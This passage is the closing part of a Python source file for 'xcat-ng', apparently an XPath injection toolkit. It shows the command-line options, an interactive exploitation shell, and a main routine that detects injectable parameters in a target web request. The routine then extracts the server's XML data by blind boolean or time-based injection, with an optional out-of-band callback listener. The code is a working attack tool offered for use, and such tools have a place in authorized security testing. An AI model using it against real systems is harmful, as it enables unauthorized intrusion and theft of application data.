            try:ui=input("xcat-ng> ")
            except(EOFError,KeyboardInterrupt):break
            ps=shlex.split(ui)if ui.strip()else[]
            if not ps:continue
            n,a=ps[0],ps[1:]
            if n not in cmds:con.print(f"[red]Unknown: {n}[/red]");continue
            try:await cmds[n].run(a)
            except SystemExit:return
            except Exception as e:con.print(f"[red]{e}[/red]")

# ═══ CLI ═════════════════════════════════════════════════════════════════════
def build_cli():
    p=argparse.ArgumentParser(description="xcat-ng — XPath Injection Toolkit",formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Examples:\n  %(prog)s -r req.txt\n  %(prog)s -r req.txt --true-string 'Welcome'\n  %(prog)s -r req.txt --false-string 'Invalid'\n  %(prog)s -u 'http://t/s?q=1' --true-code 200\n  %(prog)s -r req.txt --shell")
    s=p.add_argument_group("Source")
    s.add_argument("-r","--request",metavar="FILE",help="Burp request file")
    s.add_argument("-u","--url",help="Target URL")
    s.add_argument("-X","--method",default="GET");s.add_argument("-d","--data",help="POST body")
    s.add_argument("--json-body",help="JSON body");s.add_argument("-H","--header",action="append")
    s.add_argument("--https",action="store_true")
    d=p.add_argument_group("Detection")
    d.add_argument("-p","--param",help="Vuln param (skip auto)")
    d.add_argument("--tech",choices=[t.value for t in Tech],default="auto")
    d.add_argument("--true-string",metavar="S",help="String in TRUE response (!prefix to negate)")
    d.add_argument("--false-string",metavar="S",help="String in FALSE response (absence=TRUE)")
    d.add_argument("--true-code",metavar="C",help="Status code for TRUE (!prefix to negate)")
    e=p.add_argument_group("Engine")
    e.add_argument("--proxy");e.add_argument("--timeout",type=float,default=DEFAULT_TIMEOUT)
    e.add_argument("--delay",type=float,default=0.0);e.add_argument("-c","--concurrency",type=int,default=DEFAULT_CONC)
    e.add_argument("--insecure",action="store_true");e.add_argument("--mode",choices=[m.value for m in Mode],default="safe")
    o=p.add_argument_group("Output")
    o.add_argument("--shell",action="store_true");o.add_argument("--detect-only",action="store_true")
    o.add_argument("--oob",metavar="IP:PORT");o.add_argument("--max-depth",type=int,default=15)
    o.add_argument("--resume",metavar="FILE");o.add_argument("--save-state",metavar="FILE")
    o.add_argument("-o","--output",metavar="FILE");p.add_argument("--version",action="version",version=f"xcat-ng {VERSION}")
    return p

# ═══ Main ════════════════════════════════════════════════════════════════════
async def main():
    con.print(BANNER);p=build_cli();args=p.parse_args()
    if not args.request and not args.url:p.error("-r or -u required")
    if args.request:
        con.print(f"[bold]Loading Burp request:[/bold] {args.request}")
        try:req=parse_burp(args.request,https=args.https)
        except Exception as e:con.print(f"[red]{e}[/red]");sys.exit(1)
    else:req=build_manual(url=args.url,method=args.method,data=args.data,headers=args.header,jbody=args.json_body)
    # Info
    t=Table(box=box.ROUNDED,show_header=False,padding=(0,1));t.add_column(style="bold");t.add_column()
    t.add_row("Target",req.url);t.add_row("Method",req.method)
    if req.qp:t.add_row("Query",", ".join(f"{k}={v}"for k,v in req.qp.items()))
    if req.bp:t.add_row("Body",", ".join(f"{k}={v}"for k,v in req.bp.items()))
    if req.headers:t.add_row("Headers",f"{len(req.headers)} custom")
    con.print(Panel(t,title="[bold]Request[/bold]",border_style="blue"))
    if not req.all_params:con.print("[red]No params found.[/red]");sys.exit(1)
    cfg=Cfg(timeout=args.timeout,delay=args.delay,conc=args.concurrency,proxy=args.proxy,verify=not args.insecure,mode=Mode(args.mode))
    eng=Engine(req,cfg)
    con.print(f"\n[bold]Settings:[/bold] mode={cfg.mode.value} conc={cfg.conc} timeout={cfg.timeout}s")
    oob=None
    if args.oob:
        try:h,p2=args.oob.split(":",1);oob=OOB(h,int(p2));await oob.start()
        except Exception as e:con.print(f"[red]OOB: {e}[/red]")
    mfn=make_match(args.true_code,args.true_string,args.false_string)
    con.print("\n[bold]▸ Phase 1: Injection Detection[/bold]")
    tech,oracle,extra=await auto_detect(eng,req.all_params,Tech(args.tech),mfn=mfn,target=args.param,cfg=cfg)
    if tech is None:
        con.print("[red]✗ No injection found.[/red]")
        con.print("[dim]  Try: --true-string / --false-string / --true-code / -p <param>[/dim]")
        await eng.close();sys.exit(1)
    con.print(f"\n[green]✓ Technique:[/green] [bold]{tech.value.upper()}[/bold]")
    con.print(f"[green]  Requests:[/green] {eng.n}")
    feats={}
    if oracle and tech in(Tech.BOOLEAN,Tech.TIME):
        con.print("\n[bold]▸ Phase 2: Feature Detection[/bold]")
        feats=await detect_feats(oracle)
        ft=Table(box=box.SIMPLE,show_header=False);ft.add_column(style="bold");ft.add_column()
        for f,a in feats.items():ft.add_row(f,f"[{'green'if a else'dim red'}]{a}[/]")
        con.print(ft)
    if args.detect_only:
        con.print("\n[bold green]Done.[/bold green]");await eng.close()
        if oob:await oob.stop()
        return
    con.print()
    if tech==Tech.NORMAL and extra:
        con.print("[bold]▸ Phase 3: Normal Extraction[/bold]")
        nodes=await normal_extract(eng,extra)
        con.print(Panel("[bold]Data[/bold]",border_style="green"))
        for n in nodes:con.print(f"  [cyan]{n.name}[/cyan] = {n.value}")
    elif oracle:
        if args.shell:
            con.print("[bold]▸ Shell[/bold]")
            ex=Blind(oracle,feats,cfg.conc,mode=cfg.mode)
            await run_shell(ShCtx(oracle,ex,feats,oob))
        else:
            con.print("[bold]▸ Phase 3: Blind XML Extraction[/bold]\n")
            ex=Blind(oracle,feats,cfg.conc,mode=cfg.mode)
            state=None
            if args.resume and Path(args.resume).exists():state=SaveState.load(args.resume);con.print(f"  [dim]Resumed ({len(state.partial)} cached)[/dim]")
            elif args.save_state:state=SaveState()
            root=await extract_xml(ex,"/*[1]",maxd=args.max_depth,state=state,sp=args.save_state)
            xml='<?xml version="1.0" encoding="UTF-8"?>\n'+root.to_xml()
            con.print();con.print(Panel(Syntax(xml,"xml",theme="monokai",line_numbers=True),title="[bold green]Extracted XML[/bold green]",border_style="green",expand=True))
            if args.output:Path(args.output).write_text(xml,encoding="utf-8");con.print(f"\n[green]✓ Saved: {args.output}[/green]")
    con.print(f"\n[dim]Total requests: {eng.n}[/dim]")
    await eng.close()
    if oob:await oob.stop()

if __name__=="__main__":
    try:asyncio.run(main())
    except KeyboardInterrupt:con.print("\n[yellow]Interrupted.[/yellow]");sys.exit(130)
